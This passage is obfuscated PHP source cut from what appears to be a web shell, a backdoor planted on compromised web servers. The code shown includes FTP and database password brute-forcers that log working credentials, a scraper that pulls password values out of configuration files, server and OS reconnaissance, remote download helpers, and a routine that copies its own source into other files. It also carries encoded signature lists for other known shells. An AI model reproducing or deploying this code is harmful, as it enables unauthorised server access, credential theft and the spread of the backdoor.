            $a['web'] = z9y("89");
        }
    }
    $a['download'] = z9y("76");
    $fta = z4d($f);
    foreach ($a as $k => $v) {
        if ($k != 'exe' || ($k == 'exe' && $sh_exec))
            $r .= z7k(z5x(array('act' => 'f', 'd', 'f', 'ft' => $k), z8b($v, (($ft == $k) ?
                '12' : ((@in_array($k, $fta)) ? '13' : '14')))));
    }
    echo z7a(z7u($r));
}
function z5d($d)
{
    global $found, $found_d, $found_f, $search_i_f, $search_i_d, $ar, $with_ls, $s_rec,
        $sdir;
    $d = z1k($d);
    $h = z8x($d);
    if (count($h) > 0) {
        foreach ($h as $f) {
            $f = z2l($f);
            if ($f != "." && $f != ".." && $f != '') {
                $bool = (@empty($ar["sn_reg"]) && @strpos($f, $ar["sn"]) !== false) || ($ar["sn_reg"] &&
                    @preg_match("/" . $ar["sn"] . "/", $f));
                if (z4j($d . $f)) {
                    $search_i_d++;
                    if (@empty($ar["st"]) && (@empty($ar["s_fd"]) || $ar["s_fd"] == "2") && $bool) {
                        $found[] = $d . $f;
                        $found_d++;
                    }
                    if (!z4q($d . $f)) {
                        if (@empty($s_rec)) {
                            z5d($d . $f);
                        } elseif (@is_numeric($s_rec)) {
                            $countrec = @count(@explode('/', @substr($d . $f, @strlen($sdir))));
                            if ($countrec <= $s_rec)
                                z5d($d . $f);
                        }
                    }
                } else {
                    if (@empty($ar["s_fd"]) || $ar["s_fd"] == "1") {
                        $search_i_f++;
                        if ($bool) {
                            if (!@empty($ar["st"])) {
                                $r = z9o($d . $f);
                                if ($ar["st_wwo"]) {
                                    $ar["st"] = " " . @trim($ar["st"]) . " ";
                                }
                                if (!$ar["st_cs"]) {
                                    $ar["st"] = @strtolower($ar["st"]);
                                    $r = @strtolower($r);
                                }
                                if ($ar["st_reg"]) {
                                    $bool = @preg_match("/" . $ar["st"] . "/", $r);
                                } else {
                                    $bool = @strstr($r, $ar["st"]);
                                }
                                if ($ar["st_not"]) {
                                    $bool = !$bool;
                                }
                                if ($bool) {
                                    $found[] = $d . $f;
                                    $found_f++;
                                }
                            } else {
                                $found[] = $d . $f;
                                $found_f++;
                            }
                        }
                    }
                }
            }
        }
    }
}
function z3t($u)
{
    $s = @curl_init();
    @curl_setopt($s, CURLOPT_URL, $u);
    @curl_setopt($s, CURLOPT_USERAGENT, z7z('2', 'downloada'));
    @curl_setopt($s, CURLOPT_RETURNTRANSFER, true);
    $r = @curl_exec($s);
    @curl_close($s);
    return $r;
}
function z2h($u)
{
    $r = '';
    if (!@strstr($u, '://'))
        return $r;
    $s = @substr($u, 0, @strpos($u, '://') + 3);
    $uh = @substr($u, @strlen($s));
    $e = @explode('/', $uh);
    $h = $e[0];
    $p = @substr($uh, @strlen($h));
    $fp = @fsockopen($h, 80, $errno, $errstr, 30);
    @fputs($fp, "GET $p HTTP/1.1\r\n");
    @fputs($fp, "Host: $h\r\n");
    @fputs($fp, "User-Agent: " . z7z('2', 'downloada') . "\r\n");
    @fputs($fp, "Connection: close\r\n\r\n");
    while (!@feof($fp) && ($debug = @fgets($fp)) != "\r\n")
        ;
    while (!@feof($fp))
        $r .= @fgets($fp, 1024);
    @fclose($fp);
    return $r;
}
function z3l($host, $user, $pass, $port, $timeout)
{
    $ftp = @ftp_connect($host, $port, $timeout);
    if (!$ftp) {
        return "failed";
    } else {
        if (@ftp_login($ftp, $user, $pass)) {
            return "valid";
        } else {
            return "invalid";
        }
        @ftp_close($ftp);
    }
}
function z2f($host, $port, $time, $try1, $try2, $try3, $try4, $user, $pass = null)
{
    $count = 0;
    $success = 0;
    $res = 0;
    $log = "";
    if ($pass != null) {
        $count++;
        $res = z3l($host, $user, $pass, $port, $time);
        if ($res == "failed") {
            echo "Can't connect to $host:$port\r\n";
            return false;
        }
        if ($res == "valid") {
            echo "[+] $user:$pass - success\r\n";
            $log .= "ftp://$host:$port - $user $pass\r\n";
            $success++;
        }
        if ($res != "valid" && $try4 == "1") {
            $count++;
            $res = z3l($host, $user, z9i($pass), $port, $time);
            if ($res == "valid") {
                echo "[+] $user:" . z9i($pass) . " - success\r\n";
                $log .= "ftp://$host:$port - $user " . z9i($pass) . "\r\n";
                $success++;
            }
        }
    } else {
        $count++;
        $res = z3l($host, $user, $user, $port, $time);
        if ($res == "failed") {
            echo "Can't connect to $host:$port\r\n";
            return false;
        }
        if ($res == "valid") {
            echo "[+] $user:$user - success\r\n";
            $log .= "ftp://$host:$port - $user $user\r\n";
            $success++;
        }
        if ($res != "valid" && $try1 == "1") {
            $count++;
            $res = z3l($host, $user, @strrev($user), $port, $time);
            if ($res == "valid") {
                echo "[+] $user:" . @strrev($user) . " - success\r\n";
                $log .= "ftp://$host:$port - $user " . @strrev($user) . "\r\n";
                $success++;
            }
        }
        if ($res != "valid" && $try2 == "1") {
            $count++;
            $res = z3l($host, $user, $user . "1", $port, $time);
            if ($res == "valid") {
                echo "[+] $user:" . $user . "1 - success\r\n";
                $log .= "ftp://$host:$port - $user " . $user . "1\r\n";
                $success++;
            }
        }
        if ($res != "valid" && $try3 == "1") {
            $count++;
            $res = z3l($host, $user, $user . "123", $port, $time);
            if ($res == "valid") {
                echo "[+] $user:" . $user . "123 - success\r\n";
                $log .= "ftp://$host:$port - $user " . $user . "123\r\n";
                $success++;
            }
        }
        if ($res != "valid" && $try4 == "1") {
            $count++;
            $res = z3l($host, $user, z9i($user), $port, $time);
            if ($res == "valid") {
                echo "[+] $user:" . z9i($user) . " - success\r\n";
                $log .= "ftp://$host:$port - $user " . z9i($user) . "\r\n";
                $success++;
            }
        }
    }
    return array($count, $success, $log);
}
function z3h($host, $user, $pass, $port, $dbtype, $base = '')
{
    $sql = new my_sql();
    $sql->db = $dbtype;
    $sql->host = $host;
    $sql->port = $port;
    $sql->user = $user;
    $sql->pass = $pass;
    if ($base != '') {
        $sql->base = $base;
    }
    if ($sql->connect()) {
        return "valid";
    } else {
        return "invalid";
    }
}
function z2s($host, $port, $dbtype, $try1, $try2, $try3, $try4, $user, $pass = null,
    $sqldb = '')
{
    $count = 0;
    $success = 0;
    $res = 0;
    $log = "";
    if ($pass != null) {
        $count++;
        $res = z3h($host, $user, $pass, $port, $dbtype, $sqldb);
        if ($res == "valid") {
            echo "[+] $user:$pass - success\r\n";
            $log .= "$dbtype - $host:$port - $user $pass\r\n";
            $success++;
        }
        if ($res != "valid" && $try1 == "1") {
            $count++;
            $res = z3h($host, $user, @strrev($pass), $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . @strrev($pass) . " - success\r\n";
                $log .= "$dbtype - $host:$port - $pass " . @strrev($user) . "\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z3h($host, $user, z9i(@strrev($pass)), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i(@strrev($pass)) . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i(@strrev($pass)) . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try2 == "1") {
            $count++;
            $res = z3h($host, $user, $pass . "1", $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . $pass . "1 - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . $pass . "1\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z3h($host, $user, z9i($pass . "1"), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i($pass . "1") . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i($pass . "1") . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try3 == "1") {
            $count++;
            $res = z3h($host, $user, $pass . "123", $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . $pass . "123 - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . $pass . "123\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z3h($host, $user, z9i($pass . "123"), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i($pass . "123") . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i($pass . "123") . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try4 == "1") {
            $count++;
            $res = z3h($host, $user, z9i($pass), $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . z9i($pass) . " - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . z9i($pass) . "\r\n";
                $success++;
            }
        }
    } else {
        $count++;
        $res = z3h($host, $user, $user, $port, $dbtype, $sqldb);
        if ($res == "valid") {
            echo "[+] $user:$user - success\r\n";
            $log .= "$dbtype - $host:$port - $user $user\r\n";
            $success++;
        }
        if ($res != "valid" && $try1 == "1") {
            $count++;
            $res = z3h($host, $user, @strrev($user), $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . @strrev($user) . " - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . @strrev($user) . "\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z3h($host, $user, z9i(@strrev($user)), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i(@strrev($user)) . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i(@strrev($user)) . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try2 == "1") {
            $count++;
            $res = z3h($host, $user, $user . "1", $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . $user . "1 - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . $user . "1\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z3h($host, $user, z9i($user . "1"), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i($user . "1") . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i($user . "1") . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try3 == "1") {
            $count++;
            $res = z3h($host, $user, $user . "123", $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . $user . "123 - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . $user . "123\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z3h($host, $user, z9i($user . "123"), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i($user . "123") . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i($user . "123") . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try4 == "1") {
            $count++;
            $res = z3h($host, $user, z9i($user), $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . z9i($user) . " - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . z9i($user) . "\r\n";
                $success++;
            }
        }
    }
    return array($count, $success, $log);
}
function z2g($a, $b, $c)
{
    global $count, $success, $log;
    $count += $a;
    $success += $b;
    $log .= $c;
}
function z0m($a, $d)
{
    $z = new ZipArchive;
    if ($z->open($a) === true) {
        $z->extractTo($d);
        $z->close();
        return true;
    } else {
        return false;
    }
}
function z1w($return = false)
{
    @ob_start();
    @phpinfo(-1);
    $pi = @preg_replace(array('#^.*<body>(.*)</body>.*$#ms',
            '#<h2>PHP License</h2>.*$#ms', '#<h1>Configuration</h1>#', "#\r?\n#",
            "#</(h1|h2|h3|tr)>#", '# +<#', "#[ \t]+#", '#&nbsp;#', '#  +#', '# class=".*?"#',
            '%&#039;%', '#<tr>(?:.*?)" src="(?:.*?)=(.*?)" alt="PHP Logo" /></a>' .
            '<h1>PHP Version (.*?)</h1>(?:\n+?)</td></tr>#', '#<h1><a href="(?:.*?)\?=(.*?)">PHP Credits</a></h1>#',
            '#<tr>(?:.*?)" src="(?:.*?)=(.*?)"(?:.*?)Zend Engine (.*?),(?:.*?)</tr>#',
            "# +#", '#<tr>#', '#</tr>#'), array('$1', '', '', '', '</$1>' . "\n", '<', ' ',
            ' ', ' ', '', ' ', '<h2>PHP Configuration</h2>' . "\n" .
            '<tr><td>PHP Version</td><td>$2</td></tr>' . "\n" .
            '<tr><td>PHP Egg</td><td>$1</td></tr>',
            '<tr><td>PHP Credits Egg</td><td>$1</td></tr>',
            '<tr><td>Zend Engine</td><td>$2</td></tr>' . "\n" .
            '<tr><td>Zend Egg</td><td>$1</td></tr>', ' ', '%S%', '%E%'), @ob_get_clean());
    $sections = @explode('<h2>', @strip_tags($pi, '<h2><th><td>'));
    unset($sections[0]);
    $pi = array();
    foreach ($sections as $section) {
        $n = @substr($section, 0, @strpos($section, '</h2>'));
        @preg_match_all('#%S%(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?%E%#',
            $section, $askapache, PREG_SET_ORDER);
        foreach ($askapache as $m)
            $pi[$n][$m[1]] = (@isset($m[2]) && (!@isset($m[3]) || $m[2] == $m[3])) ? $m[2] :
                @array_slice($m, 2);
    }
    return ($return === false) ? print_r($pi) : $pi;
}
function z1b()
{
    $distros = array("SUSE LINUX" => "SuSE-release;UnitedLinux-release", "Mandrake" =>
            "mandrake-release", "MandrivaLinux" => "mandrake-release", "Gentoo" =>
            "gentoo-release", "Fedora" => "fedora-release", "RedHat" =>
            "redhat-release;redhat_version", "Slackware" =>
            "slackware-release;slackware-version", "Trustix" =>
            "trustix-release;trustix-version", "FreeEOS" => "eos-version", "Arch" =>
            "arch-release", "Cobalt" => "cobalt-release", "LinuxFromScratch" =>
            "lfs-release", "Rubix" => "rubix-version", "Ubuntu" => "lsb-release", "PLD" =>
            "pld-release", "CentOS" => "redhat-release;redhat_version", "LFS" =>
            "lfs-release;lfs_version", "HLFS" => "hlfs-release;hlfs_version", "Debian" =>
            "debian_release;debian_version");
    foreach ($distros as $k => $v) {
        $fs = @explode(";", $v);
        foreach ($fs as $f) {
            if (z4r("/etc/" . $f)) {
                $t = @str_replace("\n", "", z9o("/etc/" . $f));
                $t = @trim($t);
                if (@preg_match("/description=\"(.*)\"/i", $t, $m)) {
                    return $m[1];
                } else {
                    return $k . " ($t)";
                }
            }
        }
    }
    return "Unknown";
}
function z3o()
{
    $r = z9y("430");
    $c = $k = $b = "";
    $f = z9o("/proc/cpuinfo");
    if (!@empty($f)) {
        $a = @explode("\n", $f);
        $n = 0;
        for ($i = 0; $i < @count($a); $i++) {
            @list($x, $y, ) = @explode(":", $a[$i]);
            $x = @rtrim($x);
            $y = @rtrim($y);
            if ($x == "processor") {
                $n++;
                $r = $n;
            }
            if ($x == "vendor_id")
                $r .= $y;
            if ($x == "model name")
                $r .= $y;
            if ($x == "cpu MHz") {
                $r .= " " . @floor($y);
                $k = "y";
            }
            if ($x == "cache size")
                $c = $y;
            if ($x == "bogomips")
                $b = $y;
        }
        if ($k != "y")
            $r .= " <b>unknown</b>";
        $r .= " MHz / Cache: $c / BogoMIPS: $b";
    }
    return $r;
}
function z2j($used)
{
    return '<div class="' . z4m("4", "3") . '"><div class="' . z4m("5", "3") .
        '" style="width:' . $used . '%;">&nbsp;</div></div>';
}
function z5a()
{
    global $sh_exec, $nix;
    $mem = $buff = $swap = array("", z9y("430"));
    if ($nix && $sh_exec) {
        $m = z9e("free -b");
        if (!@empty($m)) {
            $e = @explode("\n", $m);
            foreach ($e as $l) {
                if (@preg_match('/mem:\s*([0-9]+)\s*([0-9]+)\s*([0-9]+)/i', $l, $t)) {
                    $used = @round(($t[2] / $t[1]) * 100);
                    $mem = array(z2j($used), z9y("426", z7x($t[1])) . " " . z9y("429", z7x($t[2])) .
                            " (" . $used . "%) " . z9y("465", z7x($t[3])));
                } elseif (@preg_match('/swap:\s*([0-9]+)\s*([0-9]+)\s*([0-9]+)/i', $l, $t)) {
                    $used = @round(($t[2] / $t[1]) * 100);
                    $swap = array(z2j($used), z9y("426", z7x($t[1])) . " " . z9y("429", z7x($t[2])) .
                            " (" . $used . "%) " . z9y("465", z7x($t[3])));
                } elseif (@preg_match('/-\/\+ buffers\/cache:\s*([0-9]+)\s*([0-9]+)/i', $l, $t)) {
                    $tot = ($t[1] + $t[2]);
                    $used = @round(($t[1] / $tot) * 100);
                    $buff = array(z2j($used), z9y("426", z7x($tot)) . " " . z9y("429", z7x($t[1])) .
                            " (" . $used . "%) " . z9y("465", z7x($t[2])));
                }
            }
        }
    }
    return array($mem, $buff, $swap);
}
function z9r()
{
    global $nix, $sh_exec, $dtotal, $dfree, $dused, $win;
    $it = @intval($dtotal);
    $iu = @intval($dused);
    $used = @round(($iu / $it) * 100);
    $r = array(array(z2j($used), z9y("426", $dtotal) . " " . z9y("429", $dused) .
                " (" . $used . "%) " . z9y("465", $dfree)));
    if ($win && z7e('disk_free_space') && z7e('disk_total_space')) {
        $tr = array();
        foreach (@range("B", "Z") as $let) {
            if (z4r($let . ":/")) {
                $free = @disk_free_space($let . ":/");
                $total = @disk_total_space($let . ":/");
                if ($free === false)
                    $free = 0;
                if ($total === false)
                    $total = 0;
                if ($free < 0)
                    $free = 0;
                if ($total < 0)
                    $total = 0;
                $used = ($total - $free);
                $pused = @round(($used / $total) * 100);
                $tr[$let . ":"] = array(z2j($pused), z9y("426", z7x($total)) . " " . z9y("429",
                        z7x($used)) . " (" . $pused . "%) " . z9y("465", z7x($free)));
            }
        }
        if (@count($tr) !== 0)
            $r = $tr;
    } elseif ($nix && $sh_exec) {
        $df = z9e("df -B1");
        if (!@empty($df)) {
            $e = @explode("\n", $df);
            @array_shift($e);
            $tr = array();
            foreach ($e as $l) {
                $p = @preg_split("/ /", $l, null, PREG_SPLIT_NO_EMPTY);
                if (@count($p) !== 6)
                    break;
                $used = @round(($p[2] / $p[1]) * 100);
                $tr[$p[5]] = array(z2j($used), z9y("426", z7x($p[1])) . " " . z9y("429", z7x($p[2])) .
                        " (" . $used . "%) " . z9y("465", z7x($p[3])) . " FS: " . $p[0]);
            }
            if (@count($tr) !== 0)
                $r = $tr;
        }
    }
    return $r;
}
function z2p($file, $user)
{
    global $passarray;
    if (!@isset($passarray))
        $passarray = array();
    if (!@isset($passarray[$user]))
        $passarray[$user] = array();
    $f = z9o($file);
    if (!empty($f)) {
        $regvar = '/\$([A-Za-z_][A-Za-z_0-9]*)\s*=\s*([\'"]{1})([^\2\s\t\r\n]+)\2\s*;/';
        $regvar1 = '/([\'"]{1})([A-Za-z_][A-Za-z_0-9]*)\1[\s\t\r\n]*=>[\s\t\r\n]*([\'"]{1})([^\3\s\t\r\n]+)\3/';
        $regvar2 = '/\[([\'"]{1})([A-Za-z_][A-Za-z_0-9]*)\1\][\s\t\r\n]*=[\s\t\r\n]*([\'"]{1})([^\3\s\t\r\n]+)\3/';
        $regconst = '/define\s*\(([\'"]{1})([A-Za-z_][A-Za-z_0-9]*)\1\s*,\s*([\'"]{1})([^\3\s\t\r\n]+)\3\s*\)\s*;/';
        if (@preg_match_all($regvar, $f, $m)) {
            $var = $m[1];
            $val = $m[3];
            for ($i = 0; $i < @count($var); $i++) {
                if (@preg_match('/pass/i', $var[$i])) {
                    if (!@empty($val[$i]) && !@in_array($val[$i], $passarray[$user])) {
                        $passarray[$user][] = $val[$i];
                    }
                }
            }
            unset($var);
            unset($val);
            unset($m);
        }
        if (@preg_match_all($regvar1, $f, $m)) {
            $var = $m[2];
            $val = $m[4];
            for ($i = 0; $i < @count($var); $i++) {
                if (@preg_match('/pass/i', $var[$i])) {
                    if (!@empty($val[$i]) && !@in_array($val[$i], $passarray[$user])) {
                        $passarray[$user][] = $val[$i];
                    }
                }
            }
            unset($var);
            unset($val);
            unset($m);
        }
        if (@preg_match_all($regvar2, $f, $m)) {
            $var = $m[2];
            $val = $m[4];
            for ($i = 0; $i < @count($var); $i++) {
                if (@preg_match('/pass/i', $var[$i])) {
                    if (!@empty($val[$i]) && !@in_array($val[$i], $passarray[$user])) {
                        $passarray[$user][] = $val[$i];
                    }
                }
            }
            unset($var);
            unset($val);
            unset($m);
        }
        if (@preg_match_all($regconst, $f, $m)) {
            $var = $m[2];
            $val = $m[4];
            for ($i = 0; $i < @count($var); $i++) {
                if (@preg_match('/pass/i', $var[$i])) {
                    if (!@empty($val[$i]) && !@in_array($val[$i], $passarray[$user])) {
                        $passarray[$user][] = $val[$i];
                    }
                }
            }
            unset($var);
            unset($val);
            unset($m);
        }
    }
    unset($f);
}
function z2w($file)
{
    if (!z4e($file))
        return false;
    $me = z9o(__file__);
    if (!$me)
        return false;
    return z9t($file, $me);
}
function z2r($file, $possible = 0, $replace = 0)
{
    $replaced = "";
    $knownfunc = array("c99/variant" => @explode("||", @base64_decode("ZnNlYXJjaCgkZCl8fGZ0cGJydXRlY2hlY2soJGhvc3QsJHBvcnQsJHRpbWVvdXQsJGxvZ2luLCRwYXNzLCRzaCwkZnFiX29ubHl3aXRoc2gpfHxnZXRzb3VyY2UoJGZuKXx8c2hleGl0KCl8fF9idWZmX3ByZXBhcmUoKXx8X3Nlc3NfcHV0KCRkYXRhKXx8ZGlzcGxheXNlY2luZm8oJG5hbWUsJHZhbHVlKXx8ZnNfY29weV9kaXIoJGQsJHQpfHxmc19jb3B5X29iaigkZCwkdCl8fGZzX21vdmVfZGlyKCRkLCR0KXx8ZnNfbW92ZV9vYmooJGQsJHQpfHxmc19ybWRpcigkZCl8fGZzX3Jtb2JqKCRvKXx8Z2V0bWljcm90aW1lKCl8fG15c2hlbGxleGVjKCRjbWQpfHxteXNxbF9zbWFydGVycm9yKCR0eXBlLCRzb2NrKXx8b25waHBzaHV0ZG93bigpfHxwYXJzZXNvcnQoJHNvcnQpfHxwYXJzZV9wZXJtcygkbW9kZSl8fHN0cjJtaW5pKCRjb250ZW50LCRsZW4pfHx0YWJzb3J0KCRhLCRiKXx8dmlld19wZXJtcygkbW9kZSl8fHZpZXdfcGVybXNfY29sb3IoJG8pfHx2aWV3X3NpemUoJHNpemUp")),
            "r57/variant" => @explode("||", @base64_decode("Y2YoJGZuYW1lLCR0ZXh0KXx8Y2hhbmdlX2RpdnN0KGlkKXx8Y2xvc2UoKXx8Y29tcHJlc3MoJiRmaWxlbmFtZSwmJGZpbGVkdW1wLCRjb21wcmVzcyl8fGNvbm5lY3QoKXx8Y3goKXx8RGlyRmlsZXNSKCRkaXIsJHR5cGVzPScnKXx8ZGl2KCRpZCl8fGR1bXAoJHRhYmxlKXx8ZXJyKCRuLCR0eHQ9JycpfHxleCgkY2ZlKXx8R2V0RmlsZU1hdGNoZXNDb3VudCgpfHxHZXRGaWxlc1RvdGFsKCl8fEdldE1hdGNoZXNDb3VudCgpfHxHZXRSZXN1bHRGaWxlcygpfHxHZXRUaW1lVG90YWwoKXx8R2V0VGl0bGVzKCl8fGdldF91c2VycygkZmlsZW5hbWUpfHxpbigkdHlwZSwkbmFtZSwkc2l6ZSwkdmFsdWUsJGNoZWNrZWQ9MCl8fGxvY2F0ZSgkcHIpfHxtYWlsYXR0YWNoKCR0bywkZnJvbSwkc3ViaiwkYXR0YWNoKXx8bW9yZXJlYWQoJHRlbXApfHxtb3Jld3JpdGUoJHRlbXAsJHN0cj0nJyl8fHBlcm1zKCRtb2RlKXx8cmVhZHpsaWIoJGZpbGVuYW1lLCR0ZW1wPScnKXx8c2FmZV9leCgkY2ZlKXx8U2VhcmNoUmVzdWx0KCRkaXIsJHRleHQsJGZpbHRlcj0nJyl8fFNlYXJjaFRleHQoJHBocmFzZT0wLCRjYXNlPTApfHxzaG93X2RpdihpZCl8fHNyKCRsLCR0MSwkdDIpfHx0b1VURigkeCl8fFVfdmFsdWUoJHZhbHVlKXx8VV93b3Jkd3JhcCgkc3RyKXx8dmlld19zaXplKCRzaXplKXx8d2hpY2goJHByKXx8d3MoJGkp")),
            "c37" => @explode("||", @base64_decode("Q2hlY2tCYXNlNjQoJEhhc2gpfHxDaGVja0hFWCgkSGFzaCwkQ2FzZSl8fENvbmZpZ3VyZUNoZWNrQm94ZXNQZXJtaXNzaW9ucygpfHxDb25maWd1cmVQZXJtaXNzaW9ucyh1c2VyKXx8R2V0TGFzdEVycm9yKCl8fEdldFBlcm1zKCYkRik=")),
            "BOFF" => @explode("||", @base64_decode("YShhLGMscDEscDIscDMsY2hhcnNldCl8fGFjdGlvbkJydXRlZm9yY2UoKXx8YWN0aW9uQ29uc29sZSgpfHxhY3Rpb25GaWxlc01hbigpfHxhY3Rpb25GaWxlc1Rvb2xzKCl8fGFjdGlvbkxvZ291dCgpfHxhY3Rpb25OZXR3b3JrKCl8fGFjdGlvblBocCgpfHxhY3Rpb25SQygpfHxhY3Rpb25TYWZlTW9kZSgpfHxhY3Rpb25TZWNJbmZvKCl8fGFjdGlvblNlbGZSZW1vdmUoKXx8YWN0aW9uU3FsKCl8fGFjdGlvblN0cmluZ1Rvb2xzKCl8fEJPRkZFeCgkaW4pfHxCT0ZGRm9vdGVyKCl8fEJPRkZIZWFkZXIoKXx8Qk9GRkxvZ2luKCl8fEJPRkZQZXJtcygkcCl8fEJPRkZQZXJtc0NvbG9yKCRmKXx8Qk9GRlJlY3Vyc2l2ZUdsb2IoJHBhdGgpfHxCT0ZGc3RyaXBzbGFzaGVzKCRhcnJheSl8fEJPRkZWaWV3U2l6ZSgkcyl8fEJPRkZXaGljaCgkcCl8fGJydXRlRm9yY2UoJGlwLCRwb3J0LCRsb2dpbiwkcGFzcyl8fGJydXRlRm9yY2UoJGlwLCRwb3J0LCRsb2dpbiwkcGFzcyl8fGJydXRlRm9yY2UoJGlwLCRwb3J0LCRsb2dpbiwkcGFzcyl8fGNmKCRmLCR0KXx8Y29weV9wYXN0ZSgkYywkcywkZCl8fERiQ2xhc3MoJHR5cGUpfHxkZWxldGVEaXIoJHBhdGgpfHxtb3ZlX3Bhc3RlKCRjLCRzLCRkKXx8cHJvY2Vzc1JlcUNoYW5nZSgp")),
            "devshell" => @explode("||", @base64_decode("Y2xpY2tjbWQoKXx8Y3MoJHQpfHxkbGZpbGUoJHUsJHApfHxkbGZpbGUoJHVybCwkZnBhdGgpfHxleGUoJGMpfHxncCgkZil8fGdzKCRmKXx8aW5pdCgpfHxybWRpcnMoJGQpfHxycCgkdCl8fHNob3dkaXIoJHB3ZCwkcHJvbXB0LCR3aW4pfHxzcygkdCl8fHNzYygkdCl8fHN3ZCgkcCl8fHR1a2FyKGwsYil8fHh3aGljaCgkcHIp")),
            "Egy" => @explode("||", @base64_decode("Y2FsbGZ1bmNzKCRjbW5kKXx8Y2FsbHpvbmUoJG5zY2Rpcil8fGNmKCRmbmFtZSwkdGV4dCl8fGNoYW5nZV9kaXZzdChpZCl8fGNoYW5nZV9kaXZzdChpZCl8fGNsb3NlKCl8fGNvbXByZXNzKCYkZmlsZW5hbWUsJiRmaWxlZHVtcCwkY29tcHJlc3MpfHxkZWxtKCRkZWxtdHh0KXx8RGlyRmlsZXNSKCRkaXIsJHR5cGVzPScnKXx8ZG93bmxvYWQoJGR3ZmlsZSl8fGV4KCRjZmUpfHxHZXRGaWxlTWF0Y2hlc0NvdW50KCl8fEdldEZpbGVzVG90YWwoKXx8R2V0TWF0Y2hlc0NvdW50KCl8fGdldG1pY3JvdGltZSgpfHxHZXRSZXN1bHRGaWxlcygpfHxHZXRUaW1lVG90YWwoKXx8R2V0VGl0bGVzKCl8fGluKCR0eXBlLCRuYW1lLCRzaXplLCR2YWx1ZSwkY2hlY2tlZD0wKXx8aW5jbGluaygkbGluaywkdmFsKXx8bWFpbGF0dGFjaCgkdG8sJGZyb20sJHN1YmosJGF0dGFjaCl8fG1vcmVyZWFkKCR0ZW1wKXx8bW9yZXdyaXRlKCR0ZW1wLCRzdHI9JycpfHxyZWFkemxpYigkZmlsZW5hbWUsJHRlbXA9JycpfHxzYWZlX2V4KCRjZmUpfHxTZWFyY2hSZXN1bHQoJGRpciwkdGV4dCwkZmlsdGVyPScnKXx8U2VhcmNoVGV4dCgkcGhyYXNlPTAsJGNhc2U9MCl8fHNldF9lbmNvZGVyX2lucHV0KHRleHQpfHxVX3dvcmR3cmFwKCRzdHIpfHx2aWV3X3NpemUoJHNpemUp")),
            "itsecteam" => @explode("||", @base64_decode("YWRkX2RpcigkbmFtZSl8fGJjbigkaXBiYywkcGJjKXx8YnlwY3UoJGZpbGUpfHxieXdzeW0oJGZpbGUpfHxjYWxjX2Rpcl9zaXplKCRwYXRoKXx8Y29weWYoJGZpbGUxLCRmaWxlMiwkZmlsZW5hbWUpfHxkZWxldGVEaXJlY3RvcnkoJGRpcil8fGRpcnBlKCRhZGRyZXMpfHxkaXJwbWFzcygkYWRkcmVzLCRtYXNzbmFtZSwkbWFzc3NvdXJjZSl8fGRvc3NlcnZlcigpfHxkb3dubG9hZCgkZmlsZWFkZCwkZmluYW1lKXx8bGJwKCR3Yil8fG9wZW5mKCRwYXJzZWYpfHxwcmludGRyaXZlKCl8fHF1ZXJZKCR0eXBlLCRob3N0LCR1c2VyLCRwYXNzLCRkYj0nJywkcXVlcnkpfHxzaXplZSgkc2l6ZSl8fHNxbGNsaWVuVCgp")),
